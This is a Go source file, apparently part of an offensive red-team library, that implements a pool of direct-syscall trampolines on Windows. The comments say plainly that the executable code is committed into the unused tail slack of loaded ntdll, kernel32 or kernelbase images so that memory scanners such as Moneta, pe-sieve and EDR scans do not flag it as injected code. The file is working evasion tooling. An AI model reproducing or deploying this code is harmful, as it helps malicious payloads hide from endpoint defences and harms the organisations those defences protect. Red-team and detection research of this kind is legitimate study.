//go:build windows

package syscalls

import (
	"fmt"
	"sync"
	"unsafe"

	"github.com/ashwnn/adverse-go/internal/stealth"
	"golang.org/x/sys/windows"
)

// Windows implementation of the persistent trampoline pool.
//
// Code-region placement, in order of preference:
//
//  1. Image tail slack: the reserved-but-unused space between the last
//     section's end and SizeOfImage inside a loaded system DLL (ntdll,
//     kernel32, kernelbase). The region is committed with VirtualAlloc
//     (MEM_COMMIT only) and reports Type=MEM_IMAGE to VirtualQuery, so
//     private-executable-region heuristics (Moneta, pe-sieve basic mode,
//     EDR memory scans) do not flag it as injected private code.
//  2. Private fallback: one persistent RW allocation flipped to RX once.
//     Functionally identical (no per-call churn) but remains a private
//     executable region — a documented residual for scanner visibility.
//
// Verification gap: image-slack commit semantics are implemented from the
// documented module-stomping technique (VirtualAlloc MEM_COMMIT inside a
// loaded image's SizeOfImage slack) and the fallback path guarantees
// function if a given Windows build rejects the placement. This path must be
// exercised in the Windows lab; the private fallback is the conservative
// baseline.

// trampPoolCandidates are the loaded images whose tail slack is preferred,
// in order. ntdll is always present and typically has the largest slack.
var trampPoolCandidates = []string{"ntdll.dll", "kernel32.dll", "kernelbase.dll"}

var (
	trampPoolOnce sync.Once
	trampPool     *trampolinePool
)

// getTrampolinePool builds the pool once on first use and returns it.
// A nil pool means pool construction failed; callers fall back to the legacy
// per-call path.
func getTrampolinePool() *trampolinePool {
	trampPoolOnce.Do(func() {
		trampPool = buildTrampolinePool()
	})
	return trampPool
}

// buildTrampolinePool resolves every stub's SSN, lays out slots, allocates
// the args region and (preferably image-slack) code region, writes all
// trampolines, and flips the code region to RX exactly once.
func buildTrampolinePool() *trampolinePool {
	invoker := GetInvoker()

	// 1. Resolve SSNs and generate once with placeholder addresses to learn
	//    the code lengths (length is address-independent).
	stubRefs := make([]*syscallStub, 0, len(invoker.stubs))
	stubSSNs := make([]uint16, 0, len(invoker.stubs))
	codeLens := make([]uintptr, 0, len(invoker.stubs))
	for _, stub := range invoker.stubs {
		ssn := resolveSSN(SyscallNames[stub.number], stub.number)
		// Placeholder bases: lengths are what matter here.
		code := generateTrampolineExternal(ssn, stub.argCount, 0, 0)
		stubRefs = append(stubRefs, stub)
		stubSSNs = append(stubSSNs, ssn)
		codeLens = append(codeLens, uintptr(len(code)))
	}

	entries := make([]poolEntry, len(stubRefs))
	for i, stub := range stubRefs {
		entries[i] = poolEntry{number: stub.number, argc: stub.argCount, ssn: stubSSNs[i]}
	}
	codeSize, argsSize := poolLayout(entries, codeLens)

	// 2. Args region: private RW, never flipped.
	argsBase, err := windows.VirtualAlloc(0, argsSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return nil
	}

	// 3. Code region: image slack first, private fallback second.
	codeBase, module := allocCodeRegion(codeSize)
	if codeBase == nil {
		windows.VirtualFree(argsBase, 0, windows.MEM_RELEASE)
		return nil
	}

	// 4. Generate with real addresses and write into the code region.
	for i := range entries {
		e := &entries[i]
		code := generateTrampolineExternal(e.ssn, e.argc, argsBase, e.argsOff)
		if uintptr(len(code)) > e.codeLen {
			// Cannot happen: lengths are deterministic, but never trust it.
			// Only the private allocation is ours to release — image-slack
			// pages belong to the image mapping and must not be MEM_RELEASE'd.
			windows.VirtualFree(argsBase, 0, windows.MEM_RELEASE)
			if module == "" {
				windows.VirtualFree(uintptr(codeBase), 0, windows.MEM_RELEASE)
			}
			return nil
		}
		dst := unsafe.Slice((*byte)(unsafe.Add(codeBase, e.codeOff)), len(code))
		copy(dst, code)
	}

	// 5. Single RW -> RX transition for the whole code region.
	var oldProtect uint32
	if err := windows.VirtualProtect(uintptr(codeBase), codeSize, PAGE_EXECUTE_READ, &oldProtect); err != nil {
		windows.VirtualFree(argsBase, 0, windows.MEM_RELEASE)
		if module == "" {
			windows.VirtualFree(uintptr(codeBase), 0, windows.MEM_RELEASE)
		}
		return nil
	}

	pool := &trampolinePool{
		codeBase: codeBase,
		codeSize: codeSize,
		argsBase: unsafe.Add(nil, argsBase),
		argsSize: argsSize,
		module:   module,
		entries:  make(map[uint16]*poolEntry, len(entries)),
		ready:    true,
	}
	for i := range entries {
		e := entries[i]
		pool.entries[e.number] = &e
	}
	return pool
}

// allocCodeRegion prefers image tail slack; returns (nil,"") on total failure.
func allocCodeRegion(size uintptr) (unsafe.Pointer, string) {
	for _, name := range trampPoolCandidates {
		base, slackOff, slackLen, ok := stealth.ModuleSlack(name)
		if !ok || slackLen < size {
			continue
		}
		addr, err := windows.VirtualAlloc(base+slackOff, size,
			windows.MEM_COMMIT, PAGE_READWRITE)
		if err == nil && addr == base+slackOff {
			return unsafe.Add(nil, addr), name
		}
		// MEM_COMMIT failure on this build: try the next candidate.
	}
	addr, err := windows.VirtualAlloc(0, size,
		windows.MEM_COMMIT|windows.MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return nil, ""
	}
	return unsafe.Add(nil, addr), ""
}

// poolArgsBlock returns the args block slice for an entry within the pool's
// args region.
func (p *trampolinePool) poolArgsBlock(e *poolEntry) []uintptr {
	return unsafe.Slice((*uintptr)(unsafe.Add(p.argsBase, e.argsOff)), e.argc)
}

// invoke writes the syscall arguments into the pool's RW args region and
// executes the pooled trampoline. Serialized on mu: the args region is shared
// mutable state and the caller may invoke from concurrent goroutines.
func (p *trampolinePool) invoke(stub *syscallStub, args []uintptr) (uintptr, error) {
	if !p.ready {
		return 0, fmt.Errorf("trampoline pool not ready")
	}
	e, ok := p.entryFor(stub)
	if !ok {
		return 0, fmt.Errorf("trampoline pool: unknown syscall 0x%04X", stub.number)
	}
	if len(args) < e.argc {
		return 0, fmt.Errorf("%s: requires %d arguments, got %d", SyscallNames[stub.number], e.argc, len(args))
	}

	p.mu.Lock()
	defer p.mu.Unlock()

	block := p.poolArgsBlock(e)
	for i := 0; i < e.argc; i++ {
		block[i] = args[i]
	}

	var fn func() uintptr
	*(*uintptr)(unsafe.Pointer(&fn)) = uintptr(p.codeBase) + e.codeOff
	result := fn()

	// Hygiene: wipe the args block after the call.
	for i := 0; i < e.argc; i++ {
		block[i] = 0
	}

	if result&0x80000000 != 0 {
		return result, fmt.Errorf("syscall 0x%04X (%s) failed: NTSTATUS 0x%08X",
			stub.number, SyscallNames[stub.number], result)
	}
	return result, nil
}
